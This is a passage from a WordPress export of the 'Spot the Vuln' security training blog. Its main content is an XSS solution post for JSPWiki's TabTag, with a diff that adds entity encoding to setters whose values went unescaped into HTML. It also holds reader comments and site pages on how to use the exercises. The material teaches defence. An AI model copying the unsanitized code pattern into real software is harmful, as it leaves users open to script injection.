		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-disorderly-discovery</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bnqFqD]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[a0cd41bf7e7e24a506ddf0981aa72be1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>15</wp:comment_id>
			<wp:comment_author><![CDATA[Eduardo Habkost]]></wp:comment_author>
			<wp:comment_author_email>ehabkost@raisama.net</wp:comment_author_email>
			<wp:comment_author_url>http://raisama.net/diary/</wp:comment_author_url>
			<wp:comment_author_IP>201.22.48.234</wp:comment_author_IP>
			<wp:comment_date>2009-09-29 12:48:02</wp:comment_date>
			<wp:comment_date_gmt>2009-09-29 19:48:02</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Ouch:

sb.append("&lt;div id="" + m_tabID + """);


But like on the snippet from last week, I can't be sure unless you tell us where the input data comes from and how the output data is going to be used. On the other hand, this case was more clear than the one from last week, as the destination of the output data is more obvious (as it is HTML output), and expecting the setId() caller to sanitize the data wouldn't be a good interface anyway.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>625</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/10/xss-vulnerability-disorderly-discovery/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-23 17:54:37</wp:comment_date>
			<wp:comment_date_gmt>2010-08-24 00:54:37</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Attack the Hot Fudge Sundae &nbsp;&nbsp; Disorderly Discovery [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Disorderly Discovery – XSS</title>
		<link>http://spotthevuln.com/2009/10/xss-vulnerability-disorderly-discovery/</link>
		<pubDate>Fri, 02 Oct 2009 15:00:04 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=283</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: <a href="http://spotthevuln.com/category/software/java/">JSPWiki</a></strong>

<strong>Fixed in Version: </strong>2.5.164

<strong>Issue Type:</strong> <a href="http://spotthevuln.com/category/vulnerability/xss/">Cross Site Scripting (XSS)</a>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/09/vulnerable-code-disorderly-discovery/">Found Here</a>
<h2>Description</h2>
This is a classic XSS vulnerability which affected JSPWiki.

The setId() method assigns a non-sanitized value to the m_tabID variable. The m_tabID variable is then later used in the doWikiStartTag() method as part of a stringbuffer which is used to build dynamic HTML.  The m_tabID variable is never encoded or sanitized before being echoed back to the user.

In addition, to the setId() method, the setTitle(), setAccessKey(), and setUrl() methods also expose a potential for XSS.  The JSPWiki team used TextUtil.replaceEntities() in each of the vulnerable methods to sanitize the values being assigned to the respective variables.

<strong>If you had to write the TextUtil.replaceEntities() method, what would it look like?</strong>
<h2>Developers Solution</h2>
[cce lang="diff"]
public class TabTag extends WikiTagBase {
private static final long serialVersionUID = -8534125226484616489L;
private String m_accesskey;
private String m_tabID;
private String m_tabTitle;
private String m_url;

public void setId(String aTabID)
{
-    m_tabID = aTabID;
+    m_tabID = TextUtil.replaceEntities( aTabID );
}

public void setTitle(String aTabTitle)
{
-       m_tabTitle = aTabTitle;
+       m_tabTitle = TextUtil.replaceEntities( aTabTitle );
}

public void setAccesskey(String anAccesskey)
{
-       m_accesskey = anAccesskey; //take only the first char
+       m_accesskey = TextUtil.replaceEntities( anAccesskey ); //take only the first char
}

public void setUrl( String url )
{
-       m_url = url;
+       m_url = TextUtil.replaceEntities( url );
}

public int doWikiStartTag() throws JspTagException {
TabbedSectionTag parent = (TabbedSectionTag) findAncestorWithClass(
this, TabbedSectionTag.class);

if (m_tabID == null) {
throw new JspTagException("Tab Tag without \"id\" attribute");
}
if (m_tabTitle == null) {
throw new JspTagException("Tab Tag without \"tabTitle\" attribute");
}
if (parent == null) {
throw new JspTagException(
"Tab Tag without parent \"TabbedSection\" Tag");
}

if (!parent.isStateGenerateTabBody())
return SKIP_BODY;

StringBuffer sb = new StringBuffer(32);

sb.append("&lt;div id=\"" + m_tabID + "\"");

if (!parent.validateDefaultTab(m_tabID)) {
sb.append(" class=\"hidetab\"");
}
sb.append(" &gt;\n");

try {
pageContext.getOut().write(sb.toString());
} catch (java.io.IOException e) {
throw new JspTagException("IO Error: " + e.getMessage());
}

return EVAL_BODY_INCLUDE;
}

}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>283</wp:post_id>
		<wp:post_date>2009-10-02 08:00:04</wp:post_date>
		<wp:post_date_gmt>2009-10-02 15:00:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>xss-vulnerability-disorderly-discovery</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[68689a81ceea73551656790fb37020da]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dx2DT7]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Schedule</title>
		<link>http://spotthevuln.com/schedule/</link>
		<pubDate>Sat, 19 Sep 2009 16:09:08 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?page_id=379</guid>
		<description></description>
		<content:encoded><![CDATA[Every Monday at 8:00am PST a new vulnerable code snippet will be posted.

Feel free to leave your thoughts and comments on what you think is wrong with the code snippet and why. You can be as thorough or as simplistic as you would like. If you feel like it, go ahead and post what the fix should be.

On Friday at 8:00am PST, the fix will be posted along with a description of how it was fixed.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>379</wp:post_id>
		<wp:post_date>2009-09-19 09:09:08</wp:post_date>
		<wp:post_date_gmt>2009-09-19 16:09:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>schedule</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code Release Cycle]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sociableoff</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable code is posted on Mondays and its solution is posted on Friday.]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Using this Site</title>
		<link>http://spotthevuln.com/using-spot-the-vuln/</link>
		<pubDate>Sat, 19 Sep 2009 16:13:58 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?page_id=381</guid>
		<description></description>
		<content:encoded><![CDATA[<a name="developer">
</a>
<h3><a name="developer">As a Developer</a></h3>
If you are a developer, spotthevuln.com can be an invaluable resource. It will help you write more secure code that won't have to be supported as much. Developers understand how frustrating rewriting and fixing code can be. <strong>Developers that use spotthevuln.com will limit the amount of time they spend supporting their code</strong> by writing it correctly the first time.
<a name="dev-manager">
</a>
<h3><a name="dev-manager">As a Development Manager</a></h3>
Development Managers understand that if developers write code correctly the first time, they won't have to spend as much development resources rolling out code fixes. As a development manager, the authors suggest to create a small competition among your developers. One example is have your devlopers submit code fixes to you when the vulnerable code is released. <strong>This shouldn't take more than 5-10 minutes for a junior level developer.</strong>

On Friday, review their fixes to see how they went about programming the solutions vs. how the solution was implemented. This small exercise each Monday will help your developers write more secure code in the future.
<a name="instructor">
</a>
<h3><a name="instructor">As an Instructor</a></h3>
One of the big flaws in teaching software development is the lack of security awareness among students. Realizing this, the authors attempted to create the site with this in mind.

<strong>As an instructor you can use spot the vuln to help aid your students in identifying security vulnerabilities.</strong>

If you plan on using samples from this blog as a part of a formal course of instruction or a teaching aid, you can count on one (1) vulnerability along with its solution to be presented every week.
<a name="maximize">
</a>
<h3><a name="maximize">Making the Most of SpotTheVuln</a></h3>
This blog focuses on source code analysis from a security perspective. The reader should keep in mind that writing code is only one piece of the engineering effort required to create and maintain large complex software projects. The integration of development, quality assurance, and management disciplines are essential in the smooth execution of software creation and maintenance.

Once the solution sets are posted the reader can broaden their perspective by asking themselves questions such as:
<ul>
	<li>Is the code fix implemented by the software organization a good one? Why or why not?</li>
	<li>Why did the organization choose to fix the vulnerability in the manner they did?</li>
	<li>How would you test a code base consisting of 100,000 dynamic pages for similar vulnerabilities?</li>
	<li>How would one test to ensure the fix is robust and comprehensive?</li>
	<li>What testing criteria would make a good quality gate?</li>
	<li>What engineering/administrative/automated gates can be created to ensure similar a vulnerably doesn’t make its way into future code check-ins?</li>
</ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>381</wp:post_id>
		<wp:post_date>2009-09-19 09:13:58</wp:post_date>
		<wp:post_date_gmt>2009-09-19 16:13:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>using-spot-the-vuln</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Identify Vulnerabilities in Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sociableoff</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aioseop_title</wp:meta_key>
			<wp:meta_value><![CDATA[Finding Vulnerabilities in Applications]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Ways the developers, dev managers, and instructors can identify vulnerabilities in source code.]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>twitter-logo</title>
		<link>http://spotthevuln.com/?attachment_id=390</link>
		<pubDate>Sat, 19 Sep 2009 18:51:52 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/twitter-logo.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>390</wp:post_id>
		<wp:post_date>2009-09-19 11:51:52</wp:post_date>
		<wp:post_date_gmt>2009-09-19 18:51:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>twitter-logo</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/twitter-logo.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/09/twitter-logo.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";s:3:"127";s:6:"height";s:2:"87";s:14:"hwstring_small";s:23:"height='87' width='127'";s:4:"file";s:24:"2009/09/twitter-logo.png";s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>rss-logo</title>
		<link>http://spotthevuln.com/?attachment_id=391</link>
		<pubDate>Sat, 19 Sep 2009 20:09:20 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/rss-logo.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>391</wp:post_id>
		<wp:post_date>2009-09-19 13:09:20</wp:post_date>
		<wp:post_date_gmt>2009-09-19 20:09:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rss-logo</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/rss-logo.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"369";s:6:"height";s:3:"369";s:14:"hwstring_small";s:22:"height='96' width='96'";s:4:"file";s:20:"2009/09/rss-logo.png";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:4:"file";s:20:"rss-logo-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:20:"rss-logo-300x300.png";s:5:"width";s:3:"300";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/09/rss-logo.png]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>linkedin-logo</title>
		<link>http://spotthevuln.com/?attachment_id=577</link>
		<pubDate>Fri, 04 Dec 2009 00:35:13 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/12/linkedin-logo.jpeg.gif</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>577</wp:post_id>
		<wp:post_date>2009-12-03 17:35:13</wp:post_date>
		<wp:post_date_gmt>2009-12-04 00:35:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>linkedin-logo-jpeg</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/12/linkedin-logo.jpeg.gif</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"200";s:6:"height";s:2:"74";s:14:"hwstring_small";s:23:"height='47' width='128'";s:4:"file";s:30:"2009/12/linkedin-logo.jpeg.gif";s:5:"sizes";a:1:{s:9:"thumbnail";a:3:{s:4:"file";s:29:"linkedin-logo.jpeg-150x74.gif";s:5:"width";s:3:"150";s:6:"height";s:2:"74";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/12/linkedin-logo.jpeg.gif]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>STVicon</title>
		<link>http://spotthevuln.com/?attachment_id=732</link>
		<pubDate>Thu, 18 Mar 2010 01:53:02 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2010/03/STVicon.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>732</wp:post_id>
		<wp:post_date>2010-03-17 18:53:02</wp:post_date>
		<wp:post_date_gmt>2010-03-18 01:53:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>stvicon</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2010/03/STVicon-e1268884095501.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2010/03/STVicon-e1268884095501.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";s:2:"80";s:6:"height";s:2:"80";s:14:"hwstring_small";s:22:"height='80' width='80'";s:4:"file";s:34:"2010/03/STVicon-e1268884095501.png";s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_backup_sizes</wp:meta_key>
			<wp:meta_value><![CDATA[a:2:{s:9:"full-orig";a:3:{s:5:"width";s:3:"128";s:6:"height";s:3:"128";s:4:"file";s:11:"STVicon.png";}s:18:"full-1268884095501";a:3:{s:5:"width";s:3:"100";s:6:"height";s:3:"100";s:4:"file";s:26:"STVicon-e1268884085564.png";}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cYK2wj]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9d9ee07346dfc69baa4ac97eb251a1e0]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>mundanedetail</title>
		<link>http://spotthevuln.com/2010/06/learning-insecure-logging-defense-in-depth/mundanedetail/</link>
		<pubDate>Mon, 31 May 2010 16:15:51 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2010/05/mundanedetail.wav</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>881</wp:post_id>
		<wp:post_date>2010-05-31 09:15:51</wp:post_date>
		<wp:post_date_gmt>2010-05-31 16:15:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>mundanedetail</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>879</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2010/05/mundanedetail.wav</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2010/05/mundanedetail.wav]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title></title>
		<link>http://spotthevuln.com/2010/08/1040/</link>
		<pubDate>Mon, 23 Aug 2010 19:18:12 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1040</guid>
		<description></description>
		<content:encoded><![CDATA[These are snippets of open source code that have resolved an issue with Cross-Site Scripting (XSS). After viewing the solution, you can visit the original piece of code that was susceptible to Cross-Site Scripting (XSS) by clicking the Original Code Link.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1040</wp:post_id>
		<wp:post_date>2010-08-23 12:18:12</wp:post_date>
		<wp:post_date_gmt>2010-08-23 19:18:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>1040</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>8</wp:post_parent>
		<wp:menu_order>1</wp:menu_order>
		<wp:post_type>nav_menu_item</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="nav_menu" nicename="blah"><![CDATA[Blah]]></category>
		<wp:postmeta>
			<wp:meta_key>_menu_item_type</wp:meta_key>
			<wp:meta_value><![CDATA[taxonomy]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_menu_item_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_object_id</wp:meta_key>
			<wp:meta_value><![CDATA[15]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_object</wp:meta_key>
			<wp:meta_value><![CDATA[category]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_target</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_classes</wp:meta_key>
			<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_xfn</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_url</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title></title>
		<link>http://spotthevuln.com/2010/08/1041/</link>
		<pubDate>Mon, 23 Aug 2010 19:18:12 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1041</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1041</wp:post_id>
		<wp:post_date>2010-08-23 12:18:12</wp:post_date>
		<wp:post_date_gmt>2010-08-23 19:18:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>1041</wp:post_name>
